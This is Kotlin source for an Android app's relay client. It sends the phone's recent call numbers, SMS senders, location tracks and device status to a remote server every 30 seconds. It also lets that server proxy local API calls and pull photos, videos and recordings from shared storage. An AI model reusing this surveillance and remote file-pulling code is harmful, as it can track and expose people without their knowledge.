package com.xiangqin.app.relay

import android.util.Log
import com.xiangqin.app.XiangQinApp
import io.ktor.client.*
import io.ktor.client.engine.okhttp.*
import io.ktor.client.plugins.websocket.*
import io.ktor.websocket.*
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.Base64
import java.util.concurrent.ConcurrentHashMap

object RelayClient {
    private const val TAG = "XiangQin/Relay"

    // 可通过服务器远程配置覆盖，默认值
    @Volatile var relayUrl: String = "wss://xiangqin-ws.whanghui.top"
    @Volatile var authToken: String = ""

    /** 验证中继提供的路径是否合法（仅允许 /api/ 下且无路径穿越） */
    private fun isAllowedApiPath(path: String): Boolean {
        if (!path.startsWith("/api/")) return false
        if (path.contains("..")) return false
        return true
    }

    /** 允许上传的文件路径白名单 */
    private fun isAllowedUploadPath(canonicalPath: String): Boolean {
        val ctx = XiangQinApp.instance
        val appFiles = ctx.filesDir.absolutePath
        val appCache = ctx.cacheDir.absolutePath
        return canonicalPath.startsWith(appFiles) ||
                canonicalPath.startsWith(appCache) ||
                canonicalPath.startsWith("/sdcard/") ||
                canonicalPath.startsWith("/storage/emulated/0/DCIM") ||
                canonicalPath.startsWith("/storage/emulated/0/Download") ||
                canonicalPath.startsWith("/storage/emulated/0/Pictures") ||
                canonicalPath.startsWith("/storage/emulated/0/Movies") ||
                canonicalPath.startsWith("/storage/emulated/0/Recordings")
    }

    @Volatile var isConnected = false; private set
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var client: HttpClient? = null
    @Volatile private var currentSession: WebSocketSession? = null
    private val wsChannels = ConcurrentHashMap<String, kotlinx.coroutines.channels.Channel<String>>()
    @Volatile private var lastPongTime = 0L
    private const val PONG_TIMEOUT_MS = 45_000L

    fun start() {
        Log.i(TAG, "Starting relay client")
        // 从 DataStore 加载配置
        scope.launch {
            try {
                val app = XiangQinApp.instance
                val url = app.dataStore.getRelayUrl()
                val token = app.dataStore.getRelayToken()
                if (!url.isNullOrBlank()) relayUrl = url
                if (!token.isNullOrBlank()) authToken = token
                Log.i(TAG, "Relay config loaded: url=$relayUrl, token=${if (authToken.isNotEmpty()) "****" else "(none)"}")
            } catch (e: Exception) {
                Log.w(TAG, "加载 relay 配置失败: ${e.message}")
            }
        }
        // WebSocket 连接循环
        scope.launch {
            while (isActive) {
                connectOnce()
                delay(1_000)
            }
        }
        // 定期同步数据到 relay 缓存（手机离线时浏览器读缓存）
        scope.launch {
            delay(15_000) // 首次等 15s 让 WebSocket 连上
            while (isActive) {
                syncData()
                delay(30_000)
            }
        }
    }

    fun stop() {
        isConnected = false
        client?.close()
        client = null
    }

    private fun createClient(): HttpClient {
        return HttpClient(OkHttp) {
            install(WebSockets) {
                pingInterval = 15_000
            }
        }
    }

    private suspend fun syncData() {
        if (!isConnected || client == null) return
        try {
            val app = XiangQinApp.instance
            val db = app.database
            val data = JSONObject()

            // 设备信息
            val batteryManager = app.getSystemService(android.content.Context.BATTERY_SERVICE) as? android.os.BatteryManager
            val battery = batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            val info = JSONObject().apply {
                put("battery", battery)
                put("connected", isConnected)
                put("localIp", getLocalIp())
                put("port", 8080)
                put("serviceRunning", com.xiangqin.app.service.MonitoringService.isRunning)
            }
            data.put("phone_status", info)

            // 通话记录（仅同步摘要，不传完整记录）
            try {
                val callCount = db.callDao().count()
                val recentCalls = db.callDao().getCalls(limit = 5) // 最近 5 条
                val arr = org.json.JSONArray()
                for (c in recentCalls) {
                    arr.put(JSONObject().apply {
                        put("id", c.id)
                        put("phoneNumber", c.phoneNumber)
                        put("callerName", c.callerName ?: "")
                        put("callType", c.callType)
                        put("durationSeconds", c.durationSeconds)
                        put("callTime", c.callTime)
                    })
                }
                data.put("calls", JSONObject().apply {
                    put("total", callCount)
                    put("recent", arr)
                })
            } catch (e: Exception) { Log.w(TAG, "同步通话数据失败: ${e.message}") }

            // 短信（仅同步统计，不同步内容）
            try {
                val smsCount = db.smsDao().countByDate(0, System.currentTimeMillis())
                val recentSms = db.smsDao().getSms(limit = 5) // 最近 5 条
                val arr = org.json.JSONArray()
                for (s in recentSms) {
                    arr.put(JSONObject().apply {
                        put("id", s.id)
                        put("phoneNumber", s.phoneNumber)
                        put("senderName", s.senderName ?: "")
                        put("smsType", s.smsType)
                        put("receivedTime", s.receivedTime)
                        // 不同步短信内容 body
                    })
                }
                data.put("sms", JSONObject().apply {
                    put("total", smsCount)
                    put("recent", arr)
                })
            } catch (e: Exception) { Log.w(TAG, "同步短信数据失败: ${e.message}") }

            // 告警
            try {
                val alerts = db.alertDao().getAlerts(50)
                val arr = org.json.JSONArray()
                for (a in alerts) {
                    arr.put(JSONObject().apply {
                        put("id", a.id)
                        put("type", a.type)
                        put("title", a.title)
                        put("message", a.message)
                        put("severity", a.severity)
                        put("triggeredTime", a.triggeredTime)
                        put("acknowledged", a.acknowledged)
                    })
                }
                data.put("alerts", arr)
            } catch (e: Exception) { Log.w(TAG, "同步告警数据失败: ${e.message}") }

            // 位置（最近轨迹）
            try {
                val locs = db.locationDao().getRecent(100)
                val arr = org.json.JSONArray()
                for (l in locs) {
                    arr.put(JSONObject().apply {
                        put("latitude", l.latitude)
                        put("longitude", l.longitude)
                        put("accuracy", l.accuracy)
                        put("recordedTime", l.recordedTime)
                    })
                }
                data.put("locations", JSONObject().apply {
                    put("count", locs.size)
                    put("points", arr)
                })
            } catch (e: Exception) { Log.w(TAG, "同步位置数据失败: ${e.message}") }

            // 统计摘要
            try {
                val callCount = db.callDao().count()
                val smsCount = db.smsDao().countByDate(0, System.currentTimeMillis())
                val alertCount = db.alertDao().countSince(System.currentTimeMillis() - 86400000)
                val locCount = db.locationDao().countByDateRange(0, System.currentTimeMillis())
                data.put("stats_summary", JSONObject().apply {
                    put("callCount", callCount)
                    put("smsCount", smsCount)
                    put("alertToday", alertCount)
                    put("locationCount", locCount)
                    put("serviceUptime", System.currentTimeMillis() - com.xiangqin.app.service.MonitoringService.serviceStartTime)
                })
            } catch (e: Exception) { Log.w(TAG, "同步统计数据失败: ${e.message}") }

            // 通过 WebSocket 发送数据同步（端到端加密）
            val ws = currentSession
            if (ws != null) {
                val dataJson = data.toString()
                // 使用 relay token 加密数据
                val encryptedData = if (authToken.isNotEmpty()) {
                    com.xiangqin.app.util.RelayEncryption.encrypt(dataJson, authToken)
                } else {
                    dataJson
                }
                val msg = if (authToken.isNotEmpty()) {
                    """{"type":"data_sync","encrypted":true,"data":"$encryptedData"}"""
                } else {
                    """{"type":"data_sync","encrypted":false,"data":$dataJson}"""
                }
                ws.send(Frame.Text(msg))
                Log.i(TAG, "Data synced via WS (encrypted=${authToken.isNotEmpty()}): ${data.keys().asSequence().toList()}")
            } else {
                Log.w(TAG, "Data sync skipped: no WS session")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Data sync failed: ${e.message}")
        }
    }

    private fun getLocalIp(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                if (iface.isLoopback || !iface.isUp) continue
                val addrs = iface.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (e: Exception) { Log.w(TAG, "获取本地 IP 失败: ${e.message}") }
        return ""
    }

    private suspend fun connectOnce() {
        val c = createClient()
        client = c
        try {
            Log.i(TAG, "Connecting to $relayUrl")
            c.webSocket(relayUrl) {
                Log.i(TAG, "WebSocket connected, sending auth")
                currentSession = this
                lastPongTime = System.currentTimeMillis()

                // 发送认证消息
                val authMsg = JSONObject().apply {
                    put("type", "auth")
                    put("token", authToken)
                }
                send(Frame.Text(authMsg.toString()))

                // 等待认证响应
                val authResponse = withTimeoutOrNull(5_000L) {
                    for (frame in incoming) {
                        if (frame is Frame.Text) {
                            val text = frame.readText()
                            try {
                                val msg = JSONObject(text)
                                if (msg.optString("type") == "auth_ok") {
                                    Log.i(TAG, "✅ Relay 认证成功")
                                    isConnected = true
                                    return@withTimeoutOrNull true
                                } else if (msg.optString("type") == "auth_fail") {
                                    Log.e(TAG, "❌ Relay 认证失败: ${msg.optString("error")}")
                                    return@withTimeoutOrNull false
                                }
                            } catch (_: Exception) {}
                        }
                    }
                    null
                }

                if (authResponse != true) {
                    Log.e(TAG, "认证失败或超时，断开连接")
                    close(CloseReason(CloseReason.Codes.VIOLATED_POLICY, "auth failed"))
                    return@webSocket
                }

                // 健康检查
                launch {
                    while (isActive) {
                        delay(10_000)
                        val elapsed = System.currentTimeMillis() - lastPongTime
                        if (elapsed > PONG_TIMEOUT_MS) {
                            Log.w(TAG, "Pong timeout ${elapsed}ms, force close")
                            close(CloseReason(CloseReason.Codes.NORMAL, "pong timeout"))
                            return@launch
                        }
                    }
                }
                for (frame in incoming) {
                    when (frame) {
                        is Frame.Text -> {
                            lastPongTime = System.currentTimeMillis()
                            val text = frame.readText()
                            try {
                                val msg = JSONObject(text)
                                val type = msg.optString("type")
                                when (type) {
                                    "ping" -> {
                                        // 回复 pong 保活，防止 Cloudflare 100s 空闲超时
                                        try {
                                            this@webSocket.send(Frame.Text("""{"type":"pong","ts":${System.currentTimeMillis()}}"""))
                                        } catch (_: Exception) {}
                                    }
                                    "request" -> launch { handleRequest(text, this@webSocket) }
                                    "direct_upload" -> launch { handleDirectUpload(msg, this@webSocket) }
                                    "ws_connect" -> launch { handleWsConnect(msg, this@webSocket) }
                                    "ws_frame" -> {
                                        val wsId = msg.optString("id")
                                        wsChannels[wsId]?.send(msg.optString("body", ""))
                                    }
                                    "ws_close" -> {
                                        val wsId = msg.optString("id")
                                        wsChannels[wsId]?.close()
                                        wsChannels.remove(wsId)
                                    }
                                    "stream_request" -> launch { handleStreamRequest(msg, this@webSocket) }
                                }
                            } catch (e: Exception) { Log.w(TAG, "处理消息失败: ${e.message}") }
                        }
                        is Frame.Pong -> { lastPongTime = System.currentTimeMillis() }
                        is Frame.Ping -> { lastPongTime = System.currentTimeMillis() }
                        is Frame.Close -> {
                            Log.w(TAG, "收到 Close 帧")
                            return@webSocket
                        }
                        else -> {}
                    }
                }
                Log.w(TAG, "incoming 循环结束")
            }
        } catch (e: CancellationException) {
            Log.w(TAG, "连接被取消: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "连接异常: ${e.message}")
        } finally {
            isConnected = false
            currentSession = null
            try { c.close() } catch (_: Exception) {}
            Log.i(TAG, "连接已关闭，3秒后重试")
        }
    }

    private suspend fun handleRequest(raw: String, ws: WebSocketSession) {
        try {
            val req = JSONObject(raw)
            if (req.optString("type") != "request") return
            val id = req.getString("id")
            val method = req.getString("method")
            val path = req.getString("path")
            val body = req.optString("body", "")
            val origHeaders = req.optJSONObject("headers") ?: JSONObject()

            if (!isAllowedApiPath(path)) {
                Log.w(TAG, "Blocked request to disallowed path: $path")
                ws.send(Frame.Text("""{"type":"response","id":"$id","status":403,"headers":{},"body":"{\"error\":\"forbidden path\"}"}"""))
                return
            }

            val conn = URL("http://127.0.0.1:8080$path").openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.doOutput = body.isNotEmpty()
            conn.connectTimeout = 10_000
            conn.readTimeout = 30_000
            conn.setRequestProperty("X-Relay-Auth", authToken)

            // 仅转发安全的请求头，防止 relay 注入认证头绕过本地验证
            val safeHeaders = setOf(
                "Content-Type", "Accept", "Accept-Language", "Accept-Encoding",
                "User-Agent", "Cache-Control", "Pragma"
            )
            val hKeys = origHeaders.keys()
            while (hKeys.hasNext()) {
                val k = hKeys.next()
                if (k.equals("Content-Length", ignoreCase = true)) continue
                if (!safeHeaders.contains(k)) continue
                conn.setRequestProperty(k, origHeaders.getString(k))
            }
            val bodyBytes = body.toByteArray(Charsets.UTF_8)
            if (bodyBytes.isNotEmpty()) {
                conn.setRequestProperty("Content-Length", bodyBytes.size.toString())
                conn.outputStream.use { it.write(bodyBytes) }
            }

            val status = conn.responseCode
            val respHeaders = mutableMapOf<String, String>()
            conn.headerFields.forEach { (k, v) ->
                if (k != null && k != "null") respHeaders[k] = v?.firstOrNull() ?: ""
            }
            val ct = respHeaders["Content-Type"] ?: respHeaders["content-type"] ?: ""
            val isBin = ct.startsWith("image/") || ct.startsWith("audio/") || ct.startsWith("video/")
            if (isBin) {
                val contentLength = respHeaders["Content-Length"]?.toLongOrNull() ?: 0L
                if (contentLength > 2 * 1024 * 1024 || contentLength == 0L) {
                    // 大文件或未知大小：流式分块传输（重新发起请求）
                    conn.disconnect()
                    handleStreamBinaryResponse(id, method, path, origHeaders, ws)
                    return
                }
            }
            val resp = JSONObject().apply {
                put("type", "response")
                put("id", id)
                put("status", status)
                put("headers", JSONObject(respHeaders))
                put("isBinary", isBin)
                if (isBin) {
                    val bytes = try {
                        val s = if (status in 200..399) conn.inputStream else conn.errorStream
                        s?.readBytes() ?: byteArrayOf()
                    } catch (_: Exception) { byteArrayOf() }
                    put("body", android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
                } else {
                    val respBody = try {
                        val s = if (status in 200..399) conn.inputStream else conn.errorStream
                        s?.bufferedReader()?.use { it.readText() } ?: ""
                    } catch (_: Exception) { "" }
                    put("body", respBody)
                }
            }
            ws.send(Frame.Text(resp.toString()))
            conn.disconnect()
        } catch (e: Exception) { Log.e(TAG, "Request error: ${e.message}") }
    }

    /** 大文件流式传输：构造 stream_request 消息，复用已有的流式处理逻辑 */
    private suspend fun handleStreamBinaryResponse(id: String, method: String, path: String, origHeaders: JSONObject, ws: WebSocketSession) {
        val streamReq = JSONObject().apply {
            put("type", "stream_request")
            put("id", id)
            put("method", method)
            put("path", path)
            put("headers", origHeaders)
        }
        handleStreamRequest(streamReq, ws)
    }

    private suspend fun handleDirectUpload(req: JSONObject, ws: WebSocketSession) {
        try {
            val id = req.getString("id")
            val path = req.getString("path")
            val file = java.io.File(path)
            if (!file.exists() || !file.isFile) {
                ws.send(Frame.Text("""{"type":"upload_result","id":"$id","error":"not found"}"""))
                return
            }
            val canonicalPath = try { file.canonicalPath } catch (_: Exception) { path }
            if (!isAllowedUploadPath(canonicalPath)) {
                Log.w(TAG, "Blocked upload of disallowed path: $canonicalPath")
                ws.send(Frame.Text("""{"type":"upload_result","id":"$id","error":"forbidden path"}"""))
                return
            }

            val fileName = file.name
            val fileSize = file.length()
            Log.i(TAG, "Direct upload: $fileName ($fileSize bytes)")

            // 通过 Ktor HTTP Client 直接上传（SSL 已配置）
            val url = "https://xiangqin.whanghui.top/video/receive/$id"
            val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "PUT"
            conn.doOutput = true
            conn.setChunkedStreamingMode(256 * 1024)
            conn.connectTimeout = 60_000
            conn.readTimeout = 60_000
            conn.setRequestProperty("X-File-Name", fileName)
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("Connection", "keep-alive")

            // 分块上传
            conn.outputStream.use { output ->
                file.inputStream().buffered(256 * 1024).use { input ->
                    val buf = ByteArray(256 * 1024)
                    while (true) {
                        val n = input.read(buf)
                        if (n == -1) break
                        output.write(buf, 0, n)
                        output.flush()
                    }
                }
            }

            val code = conn.responseCode
            if (code == 200) {
                val respBody = conn.inputStream.bufferedReader().use { it.readText() }
                val resp = JSONObject(respBody)
                val urlPath = resp.optString("url", "")
                ws.send(Frame.Text("""{"type":"upload_result","id":"$id","url":"$urlPath","size":$fileSize}"""))
                Log.i(TAG, "Upload done: $urlPath")
            } else {
                val errMsg = "HTTP $code"
                ws.send(Frame.Text("""{"type":"upload_result","id":"$id","error":"$errMsg"}"""))
            }
            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Direct upload error", e)
            try { ws.send(Frame.Text("""{"type":"upload_result","id":"${req.optString("id","")}","error":"upload failed"}""")) } catch (e2: Exception) { Log.w(TAG, "发送上传结果失败", e2) }
        }
    }

    private suspend fun handleWsConnect(req: JSONObject, relayWs: WebSocketSession) {
        val id = req.getString("id")
        val path = req.optString("path", "/ws")
        if (!isAllowedApiPath(path)) {
            Log.w(TAG, "Blocked WS connect to disallowed path: $path")
            try { relayWs.send(Frame.Text("""{"type":"ws_close","id":"$id"}""")) } catch (_: Exception) {}
            return
        }
        val channel = Channel<String>(Channel.UNLIMITED)
        wsChannels[id] = channel
        val localClient = createClient()
        try {
            localClient.webSocket("ws://127.0.0.1:8080$path") {
                send(Frame.Text("auth:$authToken"))
                Log.i(TAG, "WS-PROXY connected id=${id.take(8)}")
                launch {
                    for (msg in channel) {
                        val body = Base64.getDecoder().decode(msg)
                        send(Frame.Binary(true, body))
                    }
                }
                for (frame in incoming) {
                    when (frame) {
                        is Frame.Binary -> {
                            val body = Base64.getEncoder().encodeToString(frame.readBytes())
                            relayWs.send(Frame.Text("""{"type":"ws_frame","id":"$id","body":"$body"}"""))
                        }
                        is Frame.Text -> {
                            val body = Base64.getEncoder().encodeToString(frame.readText().toByteArray())
                            relayWs.send(Frame.Text("""{"type":"ws_frame","id":"$id","body":"$body"}"""))
                        }
                        is Frame.Close -> break
                        else -> {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "WS-PROXY error id=${id.take(8)}: ${e.message}")
        } finally {
            wsChannels.remove(id)
            try { localClient.close() } catch (_: Exception) {}
            try { relayWs.send(Frame.Text("""{"type":"ws_close","id":"$id"}""")) } catch (_: Exception) {}
        }
    }

    private suspend fun handleStreamRequest(req: JSONObject, ws: WebSocketSession) {
        try {
            val id = req.getString("id")
            val method = req.optString("method", "GET")
            val path = req.optString("path")
            val origHeaders = req.optJSONObject("headers") ?: JSONObject()

            if (!isAllowedApiPath(path)) {
                Log.w(TAG, "Blocked stream request to disallowed path: $path")
                val idBytes = id.toByteArray(Charsets.UTF_8)
                val endFrame = java.nio.ByteBuffer.allocate(1 + 2 + idBytes.size)
                    .put(0xFF.toByte())
                    .putShort(idBytes.size.toShort())
                    .put(idBytes)
                    .array()
                ws.send(Frame.Binary(true, endFrame))
                return
            }

            val conn = URL("http://127.0.0.1:8080$path").openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.connectTimeout = 10_000
            conn.readTimeout = 30_000
            conn.setRequestProperty("X-Relay-Auth", authToken)

            // 仅转发安全的请求头，防止 relay 注入认证头绕过本地验证
            val safeHeaders = setOf(
                "Content-Type", "Accept", "Accept-Language", "Accept-Encoding",
                "User-Agent", "Cache-Control", "Pragma"
            )
            val hKeys = origHeaders.keys()
            while (hKeys.hasNext()) {
                val k = hKeys.next()
                if (k.equals("Content-Length", ignoreCase = true)) continue
                if (!safeHeaders.contains(k)) continue
                conn.setRequestProperty(k, origHeaders.getString(k))
            }

            val status = conn.responseCode
            val respHeaders = mutableMapOf<String, String>()
            conn.headerFields.forEach { (k, v) ->
                if (k != null && k != "null") respHeaders[k] = v?.firstOrNull() ?: ""
            }

            val headerJson = JSONObject(respHeaders as Map<*, *>)
            ws.send(Frame.Text("""{"type":"stream_header","id":"$id","status":$status,"headers":$headerJson}"""))

            val inputStream = if (status in 200..399) conn.inputStream else conn.errorStream
            if (inputStream != null) {
                val idBytes = id.toByteArray(Charsets.UTF_8)
                val buffer = ByteArray(64 * 1024)
                var seq = 0
                try {
                    while (true) {
                        val read = inputStream.read(buffer)
                        if (read == -1) break
                        val chunk = if (read == buffer.size) buffer else buffer.copyOf(read)
                        // 二进制帧格式: [id_len:2][id][seq:4][data]
                        val frame = java.nio.ByteBuffer.allocate(2 + idBytes.size + 4 + read)
                            .putShort(idBytes.size.toShort())
                            .put(idBytes)
                            .putInt(seq)
                            .put(chunk, 0, read)
                            .array()
                        ws.send(Frame.Binary(true, frame))
                        seq++
                        if (seq % 10 == 0) kotlinx.coroutines.delay(10)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Stream send interrupted: ${e.message}")
                }
                inputStream.close()
            }

            // 二进制 stream_end: [0xFF][id_len:2][id]
            val idBytes = id.toByteArray(Charsets.UTF_8)
            val endFrame = java.nio.ByteBuffer.allocate(1 + 2 + idBytes.size)
                .put(0xFF.toByte())
                .putShort(idBytes.size.toShort())
                .put(idBytes)
                .array()
            ws.send(Frame.Binary(true, endFrame))
            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Stream request error: ${e.message}")
            try {
                val id = req.optString("id", "")
                ws.send(Frame.Text("""{"type":"stream_end","id":"$id"}"""))
            } catch (_: Exception) {}
        }
    }
}
